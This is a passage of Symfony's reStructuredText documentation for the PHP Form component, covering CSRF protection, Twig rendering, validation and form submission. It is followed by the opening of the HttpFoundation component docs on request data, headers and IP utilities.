object to read data off of the correct PHP superglobals (i.e. ``$_POST`` or
``$_GET``) based on the HTTP method configured on the form (POST is default).

.. seealso::

    If you need more control over exactly when your form is submitted or which
    data is passed to it,
    :doc:`use the submit() method to handle form submissions </form/direct_submit>`.

.. sidebar:: Integration with the HttpFoundation Component

    If you use the HttpFoundation component, then you should add the
    :class:`Symfony\\Component\\Form\\Extension\\HttpFoundation\\HttpFoundationExtension`
    to your form factory::

        use Symfony\Component\Form\Extension\HttpFoundation\HttpFoundationExtension;
        use Symfony\Component\Form\Forms;

        $formFactory = Forms::createFormFactoryBuilder()
            ->addExtension(new HttpFoundationExtension())
            ->getFormFactory();

    Now, when you process a form, you can pass the :class:`Symfony\\Component\\HttpFoundation\\Request`
    object to :method:`Symfony\\Component\\Form\\Form::handleRequest`::

        $form->handleRequest($request);

    .. note::

        For more information about the HttpFoundation component or how to
        install it, see :doc:`/components/http_foundation`.

CSRF Protection
~~~~~~~~~~~~~~~

Protection against CSRF attacks is built into the Form component, but you need
to explicitly enable it or replace it with a custom solution. If you want to
use the built-in support, first install the Security CSRF component:

.. code-block:: terminal

    $ composer require symfony/security-csrf

The following snippet adds CSRF protection to the form factory::

    use Symfony\Component\Form\Extension\Csrf\CsrfExtension;
    use Symfony\Component\Form\Forms;
    use Symfony\Component\HttpFoundation\RequestStack;
    use Symfony\Component\Security\Csrf\CsrfTokenManager;
    use Symfony\Component\Security\Csrf\TokenGenerator\UriSafeTokenGenerator;
    use Symfony\Component\Security\Csrf\TokenStorage\SessionTokenStorage;

    // creates a RequestStack object using the current request
    $requestStack = new RequestStack();
    $requestStack->push($request);

    $csrfGenerator = new UriSafeTokenGenerator();
    $csrfStorage = new SessionTokenStorage($requestStack);
    $csrfManager = new CsrfTokenManager($csrfGenerator, $csrfStorage);

    $formFactory = Forms::createFormFactoryBuilder()
        // ...
        ->addExtension(new CsrfExtension($csrfManager))
        ->getFormFactory();

Internally, this extension will automatically add a hidden field to every
form (called ``_token`` by default) whose value is automatically generated by
the CSRF generator and validated when binding the form.

.. tip::

    If you're not using the HttpFoundation component, you can use
    :class:`Symfony\\Component\\Security\\Csrf\\TokenStorage\\NativeSessionTokenStorage`
    instead, which relies on PHP's native session handling::

        use Symfony\Component\Security\Csrf\TokenStorage\NativeSessionTokenStorage;

        $csrfStorage = new NativeSessionTokenStorage();
        // ...

You can disable CSRF protection per form using the ``csrf_protection`` option::

    use Symfony\Component\Form\Extension\Core\Type\FormType;

    $form = $formFactory->createBuilder(FormType::class, null, ['csrf_protection' => false])
        ->getForm();

Twig Templating
~~~~~~~~~~~~~~~

If you're using the Form component to process HTML forms, you'll need a way to
render your form as HTML form fields (complete with field values, errors, and
labels). If you use `Twig`_ as your template engine, the Form component offers a
rich integration.

To use the integration, you'll need the twig bridge, which provides integration
between Twig and several Symfony components:

.. code-block:: terminal

    $ composer require symfony/twig-bridge

The TwigBridge integration provides you with several
:ref:`Twig Functions <reference-form-twig-functions-variables>`
that help you render the HTML widget, label, help and errors for each field
(as well as a few other things). To configure the integration, you'll need
to bootstrap or access Twig and add the :class:`Symfony\\Bridge\\Twig\\Extension\\FormExtension`::

    use Symfony\Bridge\Twig\Extension\FormExtension;
    use Symfony\Bridge\Twig\Form\TwigRendererEngine;
    use Symfony\Component\Form\FormRenderer;
    use Symfony\Component\Form\Forms;
    use Twig\Environment;
    use Twig\Loader\FilesystemLoader;
    use Twig\RuntimeLoader\FactoryRuntimeLoader;

    // the Twig file that holds all the default markup for rendering forms
    // this file comes with TwigBridge
    $defaultFormTheme = 'form_div_layout.html.twig';

    $vendorDirectory = realpath(__DIR__.'/../vendor');
    // the path to TwigBridge library so Twig can locate the
    // form_div_layout.html.twig file
    $appVariableReflection = new \ReflectionClass('\Symfony\Bridge\Twig\AppVariable');
    $vendorTwigBridgeDirectory = dirname($appVariableReflection->getFileName());
    // the path to your other templates
    $viewsDirectory = realpath(__DIR__.'/../views');

    $twig = new Environment(new FilesystemLoader([
        $viewsDirectory,
        $vendorTwigBridgeDirectory.'/Resources/views/Form',
    ]));
    $formEngine = new TwigRendererEngine([$defaultFormTheme], $twig);
    $twig->addRuntimeLoader(new FactoryRuntimeLoader([
        FormRenderer::class => function () use ($formEngine, $csrfManager): FormRenderer {
            return new FormRenderer($formEngine, $csrfManager);
        },
    ]));

    // ... (see the previous CSRF Protection section for more information)

    // adds the FormExtension to Twig
    $twig->addExtension(new FormExtension());

    // creates a form factory
    $formFactory = Forms::createFormFactoryBuilder()
        // ...
        ->getFormFactory();

The exact details of your `Twig Configuration`_ will vary, but the goal is
always to add the :class:`Symfony\\Bridge\\Twig\\Extension\\FormExtension`
to Twig, which gives you access to the Twig functions for rendering forms.
To do this, you first need to create a :class:`Symfony\\Bridge\\Twig\\Form\\TwigRendererEngine`,
where you define your :doc:`form themes </form/form_themes>`
(i.e. resources/files that define form HTML markup).

For general details on rendering forms, see :doc:`/form/form_customization`.

.. note::

    If you use the Twig integration, read ":ref:`component-form-intro-install-translation`"
    below for details on the needed translation filters.

.. _component-form-intro-install-translation:

Translation
~~~~~~~~~~~

If you're using the Twig integration with one of the default form theme files
(e.g. ``form_div_layout.html.twig``), there is a Twig filter (``trans``)
that is used for translating form labels, errors, option
text and other strings.

To add the ``trans`` Twig filter, you can either use the built-in
:class:`Symfony\\Bridge\\Twig\\Extension\\TranslationExtension` that integrates
with Symfony's Translation component, or add the Twig filter yourself,
via your own Twig extension.

To use the built-in integration, be sure that your project has Symfony's
Translation and :doc:`Config </components/config>` components
installed:

.. code-block:: terminal

    $ composer require symfony/translation symfony/config

Next, add the :class:`Symfony\\Bridge\\Twig\\Extension\\TranslationExtension`
to your ``Twig\Environment`` instance::

    use Symfony\Bridge\Twig\Extension\TranslationExtension;
    use Symfony\Component\Form\Forms;
    use Symfony\Component\Translation\Loader\XliffFileLoader;
    use Symfony\Component\Translation\Translator;

    // creates the Translator
    $translator = new Translator('en');
    // somehow load some translations into it
    $translator->addLoader('xlf', new XliffFileLoader());
    $translator->addResource(
        'xlf',
        __DIR__.'/path/to/translations/messages.en.xlf',
        'en'
    );

    // adds the TranslationExtension (it gives us trans filter)
    $twig->addExtension(new TranslationExtension($translator));

    $formFactory = Forms::createFormFactoryBuilder()
        // ...
        ->getFormFactory();

Depending on how your translations are being loaded, you can now add string
keys, such as field labels, and their translations to your translation files.

For more details on translations, see :doc:`/translation`.

Validation
~~~~~~~~~~

The Form component comes with tight (but optional) integration with Symfony's
Validator component. If you're using a different solution for validation,
no problem! Take the submitted/bound data of your form (which is an
array or object) and pass it through your own validation system.

To use the integration with Symfony's Validator component, first make sure
it's installed in your application:

.. code-block:: terminal

    $ composer require symfony/validator

If you're not familiar with Symfony's Validator component, read more about
it: :doc:`/validation`. The Form component comes with a
:class:`Symfony\\Component\\Form\\Extension\\Validator\\ValidatorExtension`
class, which automatically applies validation to your data on bind. These
errors are then mapped to the correct field and rendered.

Your integration with the Validation component will look something like this::

    use Symfony\Component\Form\Extension\Validator\ValidatorExtension;
    use Symfony\Component\Form\Forms;
    use Symfony\Component\Validator\Validation;

    $vendorDirectory = realpath(__DIR__.'/../vendor');
    $vendorFormDirectory = $vendorDirectory.'/symfony/form';
    $vendorValidatorDirectory = $vendorDirectory.'/symfony/validator';

    // creates the validator - details will vary
    $validator = Validation::createValidator();

    // there are built-in translations for the core error messages
    $translator->addResource(
        'xlf',
        $vendorFormDirectory.'/Resources/translations/validators.en.xlf',
        'en',
        'validators'
    );
    $translator->addResource(
        'xlf',
        $vendorValidatorDirectory.'/Resources/translations/validators.en.xlf',
        'en',
        'validators'
    );

    $formFactory = Forms::createFormFactoryBuilder()
        // ...
        ->addExtension(new ValidatorExtension($validator))
        ->getFormFactory();

To learn more, skip down to the :ref:`component-form-intro-validation` section.

Accessing the Form Factory
~~~~~~~~~~~~~~~~~~~~~~~~~~

Your application only needs one form factory, and that one factory object
should be used to create any and all form objects in your application. This
means that you should create it in some central, bootstrap part of your application
and then access it whenever you need to build a form.

.. note::

    In this document, the form factory is always a local variable called
    ``$formFactory``. The point here is that you will probably need to create
    this object in some more "global" way so you can access it from anywhere.

Exactly how you gain access to your one form factory is up to you. If you're
using a service container (like provided with the
:doc:`DependencyInjection component </components/dependency_injection>`),
then you should add the form factory to your container and grab it out whenever
you need to. If your application uses global or static variables (not usually a
good idea), then you can store the object on some static class or do something
similar.

.. _component-form-intro-create-simple-form:

Creating a simple Form
----------------------

.. tip::

    If you're using the Symfony Framework, then the form factory is available
    automatically as a service called ``form.factory``, you can inject it as
    ``Symfony\Component\Form\FormFactoryInterface``. Also, the default
    base controller class has a :method:`Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController::createFormBuilder`
    method, which is a shortcut to fetch the form factory and call ``createBuilder()``
    on it.

Creating a form is done via a :class:`Symfony\\Component\\Form\\FormBuilder`
object, where you build and configure different fields. The form builder
is created from the form factory.

.. configuration-block::

    .. code-block:: php-symfony

        // src/Controller/TaskController.php
        namespace App\Controller;

        use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
        use Symfony\Component\Form\Extension\Core\Type\DateType;
        use Symfony\Component\Form\Extension\Core\Type\TextType;
        use Symfony\Component\HttpFoundation\Request;
        use Symfony\Component\HttpFoundation\Response;

        class TaskController extends AbstractController
        {
            public function new(Request $request): Response
            {
                // createFormBuilder is a shortcut to get the "form factory"
                // and then call "createBuilder()" on it

                $form = $this->createFormBuilder()
                    ->add('task', TextType::class)
                    ->add('dueDate', DateType::class)
                    ->getForm();

                return $this->render('task/new.html.twig', [
                    'form' => $form->createView(),
                ]);
            }
        }

    .. code-block:: php-standalone

        use Symfony\Component\Form\Extension\Core\Type\DateType;
        use Symfony\Component\Form\Extension\Core\Type\TextType;

        // ...

        $form = $formFactory->createBuilder()
            ->add('task', TextType::class)
            ->add('dueDate', DateType::class)
            ->getForm();

        var_dump($twig->render('new.html.twig', [
            'form' => $form->createView(),
        ]));

As you can see, creating a form is like writing a recipe: you call ``add()``
for each new field you want to create. The first argument to ``add()`` is the
name of your field, and the second is the fully qualified class name. The Form
component comes with a lot of :doc:`built-in types </reference/forms/types>`.

Now that you've built your form, learn how to :ref:`render <component-form-intro-rendering-form>`
it and :ref:`process the form submission <component-form-intro-handling-submission>`.

Setting default Values
~~~~~~~~~~~~~~~~~~~~~~

If you need your form to load with some default values (or you're building
an "edit" form), pass in the default data when creating your form builder:

.. configuration-block::

    .. code-block:: php-symfony

        // src/Controller/DefaultController.php
        namespace App\Controller;

        use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
        use Symfony\Component\Form\Extension\Core\Type\DateType;
        use Symfony\Component\Form\Extension\Core\Type\TextType;
        use Symfony\Component\HttpFoundation\Response;

        class DefaultController extends AbstractController
        {
            public function new(Request $request): Response
            {
                $defaults = [
                    'dueDate' => new \DateTime('tomorrow'),
                ];

                $form = $this->createFormBuilder($defaults)
                    ->add('task', TextType::class)
                    ->add('dueDate', DateType::class)
                    ->getForm();

                // ...
            }
        }

    .. code-block:: php-standalone

        use Symfony\Component\Form\Extension\Core\Type\DateType;
        use Symfony\Component\Form\Extension\Core\Type\FormType;
        use Symfony\Component\Form\Extension\Core\Type\TextType;

        // ...

        $defaults = [
            'dueDate' => new \DateTime('tomorrow'),
        ];

        $form = $formFactory->createBuilder(FormType::class, $defaults)
            ->add('task', TextType::class)
            ->add('dueDate', DateType::class)
            ->getForm();

.. tip::

    In this example, the default data is an array. Later, when you use the
    :ref:`data_class <form-data-class>` option to bind data directly to
    objects, your default data will be an instance of that object.

.. _component-form-intro-rendering-form:

Rendering the Form
~~~~~~~~~~~~~~~~~~

Now that the form has been created, the next step is to render it. This is
done by passing a special form "view" object to your template (notice the
``$form->createView()`` in the controller above) and using a set of
:ref:`form helper functions <reference-form-twig-functions>`:

.. code-block:: html+twig

    {{ form_start(form) }}
        {{ form_widget(form) }}

        <input type="submit">
    {{ form_end(form) }}

.. image:: /_images/form/simple-form.png
    :alt: An HTML form showing a text box labelled "Task", three select boxes for a year, month and day labelled "Due date" and a button labelled "Create Task".

That's it! By printing ``form_widget(form)``, each field in the form is
rendered, along with a label and error message (if there is one). While this is
convenient, it's not very flexible (yet). Usually, you'll want to render each
form field individually so you can control how the form looks. You'll learn how
to do that in the :doc:`form customization </form/form_customization>` article.

Changing a Form's Method and Action
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

By default, a form is submitted to the same URI that rendered the form with
an HTTP POST request. This behavior can be changed using the :ref:`form-option-action`
and :ref:`form-option-method` options (the ``method`` option is also used
by :method:`Symfony\\Component\\Form\\Form::handleRequest` to determine whether a form has been submitted):

.. configuration-block::

    .. code-block:: php-symfony

        // src/Controller/DefaultController.php
        namespace App\Controller;

        use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
        use Symfony\Component\Form\Extension\Core\Type\FormType;
        use Symfony\Component\HttpFoundation\Response;

        class DefaultController extends AbstractController
        {
            public function search(): Response
            {
                $formBuilder = $this->createFormBuilder(null, [
                    'action' => '/search',
                    'method' => 'GET',
                ]);

                // ...
            }
        }

    .. code-block:: php-standalone

        use Symfony\Component\Form\Extension\Core\Type\FormType;

        // ...

        $formBuilder = $formFactory->createBuilder(FormType::class, null, [
            'action' => '/search',
            'method' => 'GET',
        ]);

        // ...

.. _component-form-intro-handling-submission:

Handling Form Submissions
~~~~~~~~~~~~~~~~~~~~~~~~~

To handle form submissions, use the :method:`Symfony\\Component\\Form\\Form::handleRequest`
method:

.. configuration-block::

    .. code-block:: php-symfony

        // src/Controller/TaskController.php
        namespace App\Controller;

        use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
        use Symfony\Component\Form\Extension\Core\Type\DateType;
        use Symfony\Component\Form\Extension\Core\Type\TextType;
        use Symfony\Component\HttpFoundation\Response;

        class TaskController extends AbstractController
        {
            public function new(Request $request): Response
            {
                $form = $this->createFormBuilder()
                    ->add('task', TextType::class)
                    ->add('dueDate', DateType::class)
                    ->getForm();

                $form->handleRequest($request);

                if ($form->isSubmitted() && $form->isValid()) {
                    $data = $form->getData();

                    // ... perform some action, such as saving the data to the database

                    return $this->redirectToRoute('task_success');
                }

                // ...
            }
        }

    .. code-block:: php-standalone

        use Symfony\Component\Form\Extension\Core\Type\DateType;
        use Symfony\Component\Form\Extension\Core\Type\TextType;
        use Symfony\Component\HttpFoundation\RedirectResponse;
        use Symfony\Component\HttpFoundation\Request;

        // ...

        $form = $formFactory->createBuilder()
            ->add('task', TextType::class)
            ->add('dueDate', DateType::class)
            ->getForm();

        $request = Request::createFromGlobals();

        $form->handleRequest($request);

        if ($form->isSubmitted() && $form->isValid()) {
            $data = $form->getData();

            // ... perform some action, such as saving the data to the database

            $response = new RedirectResponse('/task/success');
            $response->prepare($request);

            return $response->send();
        }

        // ...

.. caution::

    The form's ``createView()`` method should be called *after* ``handleRequest()`` is
    called. Otherwise, when using :doc:`form events </form/events>`, changes done
    in the ``*_SUBMIT`` events won't be applied to the view (like validation errors).

This defines a common form "workflow", which contains 3 different possibilities:

#. On the initial GET request (i.e. when the user "surfs" to your page),
   build your form and render it;

   If the request is a POST, process the submitted data (via :method:`Symfony\\Component\\Form\\Form::handleRequest`).

   Then:

#. if the form is invalid, re-render the form (which will now contain errors);
#. if the form is valid, perform some action and redirect.

Luckily, you don't need to decide whether or not a form has been submitted.
Just pass the current request to the :method:`Symfony\\Component\\Form\\Form::handleRequest`
method. Then, the Form component will do all the necessary work for you.

.. _component-form-intro-validation:

Form Validation
~~~~~~~~~~~~~~~

The easiest way to add validation to your form is via the ``constraints``
option when building each field:

.. configuration-block::

    .. code-block:: php-symfony

        // src/Controller/DefaultController.php
        namespace App\Controller;

        use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
        use Symfony\Component\Form\Extension\Core\Type\DateType;
        use Symfony\Component\Form\Extension\Core\Type\TextType;
        use Symfony\Component\HttpFoundation\Response;
        use Symfony\Component\Validator\Constraints\NotBlank;
        use Symfony\Component\Validator\Constraints\Type;

        class DefaultController extends AbstractController
        {
            public function new(Request $request): Response
            {
                $form = $this->createFormBuilder()
                    ->add('task', TextType::class, [
                        'constraints' => new NotBlank(),
                    ])
                    ->add('dueDate', DateType::class, [
                        'constraints' => [
                            new NotBlank(),
                            new Type(\DateTime::class),
                        ],
                    ])
                    ->getForm();
                // ...
            }
        }

    .. code-block:: php-standalone

        use Symfony\Component\Form\Extension\Core\Type\DateType;
        use Symfony\Component\Form\Extension\Core\Type\TextType;
        use Symfony\Component\Validator\Constraints\NotBlank;
        use Symfony\Component\Validator\Constraints\Type;

        $form = $formFactory->createBuilder()
            ->add('task', TextType::class, [
                'constraints' => new NotBlank(),
            ])
            ->add('dueDate', DateType::class, [
                'constraints' => [
                    new NotBlank(),
                    new Type(\DateTime::class),
                ],
            ])
            ->getForm();

When the form is bound, these validation constraints will be applied automatically
and the errors will display next to the fields on error.

.. note::

    For a list of all of the built-in validation constraints, see
    :doc:`/reference/constraints`.

Accessing Form Errors
~~~~~~~~~~~~~~~~~~~~~

You can use the :method:`Symfony\\Component\\Form\\FormInterface::getErrors`
method to access the list of errors. It returns a
:class:`Symfony\\Component\\Form\\FormErrorIterator` instance::

    $form = ...;

    // ...

    // a FormErrorIterator instance, but only errors attached to this
    // form level (e.g. global errors)
    $errors = $form->getErrors();

    // a FormErrorIterator instance, but only errors attached to the
    // "firstName" field
    $errors = $form['firstName']->getErrors();

    // a FormErrorIterator instance including child forms in a flattened structure
    // use getOrigin() to determine the form causing the error
    $errors = $form->getErrors(true);

    // a FormErrorIterator instance including child forms without flattening the output structure
    $errors = $form->getErrors(true, false);

Clearing Form Errors
~~~~~~~~~~~~~~~~~~~~

Any errors can be manually cleared using the
:method:`Symfony\\Component\\Form\\ClearableErrorsInterface::clearErrors`
method. This is useful when you'd like to validate the form without showing
validation errors to the user (i.e. during a partial AJAX submission or
:doc:`dynamic form modification </form/dynamic_form_modification>`).

Because clearing the errors makes the form valid,
:method:`Symfony\\Component\\Form\\ClearableErrorsInterface::clearErrors`
should only be called after testing whether the form is valid.

Learn more
----------

.. toctree::
    :maxdepth: 1
    :glob:

    /form/*

.. _Twig: https://twig.symfony.com
.. _`Twig Configuration`: https://twig.symfony.com/doc/3.x/intro.html
The HttpFoundation Component
============================

    The HttpFoundation component defines an object-oriented layer for the HTTP
    specification.

In PHP, the request is represented by some global variables (``$_GET``,
``$_POST``, ``$_FILES``, ``$_COOKIE``, ``$_SESSION``, ...) and the response is
generated by some functions (``echo``, ``header()``, ``setcookie()``, ...).

The Symfony HttpFoundation component replaces these default PHP global
variables and functions by an object-oriented layer.

Installation
------------

.. code-block:: terminal

    $ composer require symfony/http-foundation

.. include:: /components/require_autoload.rst.inc

.. seealso::

    This article explains how to use the HttpFoundation features as an
    independent component in any PHP application. In Symfony applications
    everything is already configured and ready to use. Read the :doc:`/controller`
    article to learn about how to use these features when creating controllers.

.. _component-http-foundation-request:

Request
-------

The most common way to create a request is to base it on the current PHP global
variables with
:method:`Symfony\\Component\\HttpFoundation\\Request::createFromGlobals`::

    use Symfony\Component\HttpFoundation\Request;

    $request = Request::createFromGlobals();

which is almost equivalent to the more verbose, but also more flexible,
:method:`Symfony\\Component\\HttpFoundation\\Request::__construct` call::

    $request = new Request(
        $_GET,
        $_POST,
        [],
        $_COOKIE,
        $_FILES,
        $_SERVER
    );

.. _accessing-request-data:

Accessing Request Data
~~~~~~~~~~~~~~~~~~~~~~

A Request object holds information about the client request. This information
can be accessed via several public properties:

* ``request``: equivalent of ``$_POST``;

* ``query``: equivalent of ``$_GET`` (``$request->query->get('name')``);

* ``cookies``: equivalent of ``$_COOKIE``;

* ``attributes``: no equivalent - used by your app to store other data (see :ref:`below <component-foundation-attributes>`);

* ``files``: equivalent of ``$_FILES``;

* ``server``: equivalent of ``$_SERVER``;

* ``headers``: mostly equivalent to a subset of ``$_SERVER``
  (``$request->headers->get('User-Agent')``).

Each property is a :class:`Symfony\\Component\\HttpFoundation\\ParameterBag`
instance (or a subclass of), which is a data holder class:

* ``request``: :class:`Symfony\\Component\\HttpFoundation\\ParameterBag` or
  :class:`Symfony\\Component\\HttpFoundation\\InputBag` if the data is
  coming from ``$_POST`` parameters;

* ``query``: :class:`Symfony\\Component\\HttpFoundation\\InputBag`;

* ``cookies``: :class:`Symfony\\Component\\HttpFoundation\\InputBag`;

* ``attributes``: :class:`Symfony\\Component\\HttpFoundation\\ParameterBag`;

* ``files``: :class:`Symfony\\Component\\HttpFoundation\\FileBag`;

* ``server``: :class:`Symfony\\Component\\HttpFoundation\\ServerBag`;

* ``headers``: :class:`Symfony\\Component\\HttpFoundation\\HeaderBag`.

All :class:`Symfony\\Component\\HttpFoundation\\ParameterBag` instances have
methods to retrieve and update their data:

:method:`Symfony\\Component\\HttpFoundation\\ParameterBag::all`
    Returns the parameters.

:method:`Symfony\\Component\\HttpFoundation\\ParameterBag::keys`
    Returns the parameter keys.

:method:`Symfony\\Component\\HttpFoundation\\ParameterBag::replace`
    Replaces the current parameters by a new set.

:method:`Symfony\\Component\\HttpFoundation\\ParameterBag::add`
    Adds parameters.

:method:`Symfony\\Component\\HttpFoundation\\ParameterBag::get`
    Returns a parameter by name.

:method:`Symfony\\Component\\HttpFoundation\\ParameterBag::set`
    Sets a parameter by name.

:method:`Symfony\\Component\\HttpFoundation\\ParameterBag::has`
    Returns ``true`` if the parameter is defined.

:method:`Symfony\\Component\\HttpFoundation\\ParameterBag::remove`
    Removes a parameter.

The :class:`Symfony\\Component\\HttpFoundation\\ParameterBag` instance also
has some methods to filter the input values:

:method:`Symfony\\Component\\HttpFoundation\\ParameterBag::getAlpha`
    Returns the alphabetic characters of the parameter value;

:method:`Symfony\\Component\\HttpFoundation\\ParameterBag::getAlnum`
    Returns the alphabetic characters and digits of the parameter value;

:method:`Symfony\\Component\\HttpFoundation\\ParameterBag::getBoolean`
    Returns the parameter value converted to boolean;

:method:`Symfony\\Component\\HttpFoundation\\ParameterBag::getDigits`
    Returns the digits of the parameter value;

:method:`Symfony\\Component\\HttpFoundation\\ParameterBag::getInt`
    Returns the parameter value converted to integer;

:method:`Symfony\\Component\\HttpFoundation\\ParameterBag::getEnum`
    Returns the parameter value converted to a PHP enum;

:method:`Symfony\\Component\\HttpFoundation\\ParameterBag::getString`
    Returns the parameter value as a string;

:method:`Symfony\\Component\\HttpFoundation\\ParameterBag::filter`
    Filters the parameter by using the PHP :phpfunction:`filter_var` function.
    If invalid values are found, a
    :class:`Symfony\\Component\\HttpKernel\\Exception\\BadRequestHttpException`
    is thrown. The ``FILTER_NULL_ON_FAILURE`` flag can be used to ignore invalid
    values.

All getters take up to two arguments: the first one is the parameter name
and the second one is the default value to return if the parameter does not
exist::

    // the query string is '?foo=bar'

    $request->query->get('foo');
    // returns 'bar'

    $request->query->get('bar');
    // returns null

    $request->query->get('bar', 'baz');
    // returns 'baz'

When PHP imports the request query, it handles request parameters like
``foo[bar]=baz`` in a special way as it creates an array. The ``get()`` method
doesn't support returning arrays, so you need to use the following code::

    // the query string is '?foo[bar]=baz'

    // don't use $request->query->get('foo'); use the following instead:
    $request->query->all('foo');
    // returns ['bar' => 'baz']

    // if the requested parameter does not exist, an empty array is returned:
    $request->query->all('qux');
    // returns []

    $request->query->get('foo[bar]');
    // returns null

    $request->query->all()['foo']['bar'];
    // returns 'baz'

.. _component-foundation-attributes:

Thanks to the public ``attributes`` property, you can store additional data
in the request, which is also an instance of
:class:`Symfony\\Component\\HttpFoundation\\ParameterBag`. This is mostly used
to attach information that belongs to the Request and that needs to be
accessed from many different points in your application.

Finally, the raw data sent with the request body can be accessed using
:method:`Symfony\\Component\\HttpFoundation\\Request::getContent`::

    $content = $request->getContent();

For instance, this may be useful to process an XML string sent to the
application by a remote service using the HTTP POST method.

If the request body is a JSON string, it can be accessed using
:method:`Symfony\\Component\\HttpFoundation\\Request::toArray`::

    $data = $request->toArray();

If the request data could be ``$_POST`` data *or* a JSON string, you can use
the :method:`Symfony\\Component\\HttpFoundation\\Request::getPayload` method
which returns an instance of :class:`Symfony\\Component\\HttpFoundation\\InputBag`
wrapping this data::

    $data = $request->getPayload();

Identifying a Request
~~~~~~~~~~~~~~~~~~~~~

In your application, you need a way to identify a request; most of the time,
this is done via the "path info" of the request, which can be accessed via the
:method:`Symfony\\Component\\HttpFoundation\\Request::getPathInfo` method::

    // for a request to http://example.com/blog/index.php/post/hello-world
    // the path info is "/post/hello-world"
    $request->getPathInfo();

Simulating a Request
~~~~~~~~~~~~~~~~~~~~

Instead of creating a request based on the PHP globals, you can also simulate
a request::

    $request = Request::create(
        '/hello-world',
        'GET',
        ['name' => 'Fabien']
    );

The :method:`Symfony\\Component\\HttpFoundation\\Request::create` method
creates a request based on a URI, a method and some parameters (the
query parameters or the request ones depending on the HTTP method); and of
course, you can also override all other variables as well (by default, Symfony
creates sensible defaults for all the PHP global variables).

Based on such a request, you can override the PHP global variables via
:method:`Symfony\\Component\\HttpFoundation\\Request::overrideGlobals`::

    $request->overrideGlobals();

.. tip::

    You can also duplicate an existing request via
    :method:`Symfony\\Component\\HttpFoundation\\Request::duplicate` or
    change a bunch of parameters with a single call to
    :method:`Symfony\\Component\\HttpFoundation\\Request::initialize`.

Accessing the Session
~~~~~~~~~~~~~~~~~~~~~

If you have a session attached to the request, you can access it via the
``getSession()`` method of the :class:`Symfony\\Component\\HttpFoundation\\Request`
or :class:`Symfony\\Component\\HttpFoundation\\RequestStack` class;
the :method:`Symfony\\Component\\HttpFoundation\\Request::hasPreviousSession`
method tells you if the request contains a session which was started in one of
the previous requests.

Processing HTTP Headers
~~~~~~~~~~~~~~~~~~~~~~~

Processing HTTP headers is not a trivial task because of the escaping and white
space handling of their contents. Symfony provides a
:class:`Symfony\\Component\\HttpFoundation\\HeaderUtils` class that abstracts
this complexity and defines some methods for the most common tasks::

    use Symfony\Component\HttpFoundation\HeaderUtils;

    // Splits an HTTP header by one or more separators
    HeaderUtils::split('da, en-gb;q=0.8', ',;');
    // => [['da'], ['en-gb','q=0.8']]

    // Combines an array of arrays into one associative array
    HeaderUtils::combine([['foo', 'abc'], ['bar']]);
    // => ['foo' => 'abc', 'bar' => true]

    // Joins an associative array into a string for use in an HTTP header
    HeaderUtils::toString(['foo' => 'abc', 'bar' => true, 'baz' => 'a b c'], ',');
    // => 'foo=abc, bar, baz="a b c"'

    // Encodes a string as a quoted string, if necessary
    HeaderUtils::quote('foo "bar"');
    // => '"foo \"bar\""'

    // Decodes a quoted string
    HeaderUtils::unquote('"foo \"bar\""');
    // => 'foo "bar"'

    // Parses a query string but maintains dots (PHP parse_str() replaces '.' by '_')
    HeaderUtils::parseQuery('foo[bar.baz]=qux');
    // => ['foo' => ['bar.baz' => 'qux']]

Accessing ``Accept-*`` Headers Data
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

You can access basic data extracted from ``Accept-*`` headers
by using the following methods:

:method:`Symfony\\Component\\HttpFoundation\\Request::getAcceptableContentTypes`
    Returns the list of accepted content types ordered by descending quality.

:method:`Symfony\\Component\\HttpFoundation\\Request::getLanguages`
    Returns the list of accepted languages ordered by descending quality.

:method:`Symfony\\Component\\HttpFoundation\\Request::getCharsets`
    Returns the list of accepted charsets ordered by descending quality.

:method:`Symfony\\Component\\HttpFoundation\\Request::getEncodings`
    Returns the list of accepted encodings ordered by descending quality.

If you need to get full access to parsed data from ``Accept``, ``Accept-Language``,
``Accept-Charset`` or ``Accept-Encoding``, you can use
:class:`Symfony\\Component\\HttpFoundation\\AcceptHeader` utility class::

    use Symfony\Component\HttpFoundation\AcceptHeader;

    $acceptHeader = AcceptHeader::fromString($request->headers->get('Accept'));
    if ($acceptHeader->has('text/html')) {
        $item = $acceptHeader->get('text/html');
        $charset = $item->getAttribute('charset', 'utf-8');
        $quality = $item->getQuality();
    }

    // Accept header items are sorted by descending quality
    $acceptHeaders = AcceptHeader::fromString($request->headers->get('Accept'))
        ->all();

The default values that can be optionally included in the ``Accept-*`` headers
are also supported::

    $acceptHeader = 'text/plain;q=0.5, text/html, text/*;q=0.8, */*;q=0.3';
    $accept = AcceptHeader::fromString($acceptHeader);

    $quality = $accept->get('text/xml')->getQuality(); // $quality = 0.8
    $quality = $accept->get('application/xml')->getQuality(); // $quality = 0.3

Anonymizing IP Addresses
~~~~~~~~~~~~~~~~~~~~~~~~

An increasingly common need for applications to comply with user protection
regulations is to anonymize IP addresses before logging and storing them for
analysis purposes. Use the ``anonymize()`` method from the
:class:`Symfony\\Component\\HttpFoundation\\IpUtils` to do that::

    use Symfony\Component\HttpFoundation\IpUtils;

    $ipv4 = '123.234.235.236';
    $anonymousIpv4 = IpUtils::anonymize($ipv4);
    // $anonymousIpv4 = '123.234.235.0'

    $ipv6 = '2a01:198:603:10:396e:4789:8e99:890f';
    $anonymousIpv6 = IpUtils::anonymize($ipv6);
    // $anonymousIpv6 = '2a01:198:603:10::'

Check if an IP Belongs to a Private Subnet
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If you need to know if an IP address belongs to a private subnet, you can
use the ``isPrivateIp()`` method from the
:class:`Symfony\\Component\\HttpFoundation\\IpUtils` to do that::

    use Symfony\Component\HttpFoundation\IpUtils;

    $ipv4 = '192.168.1.1';
    $isPrivate = IpUtils::isPrivateIp($ipv4);
    // $isPrivate = true

    $ipv6 = '2a01:198:603:10:396e:4789:8e99:890f';
    $isPrivate = IpUtils::isPrivateIp($ipv6);
    // $isPrivate = false

Matching a Request Against a Set of Rules
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The HttpFoundation component provides some matcher classes that allow you to
check if a given request meets certain conditions (e.g. it comes from some IP
address, it uses a certain HTTP method, etc.):

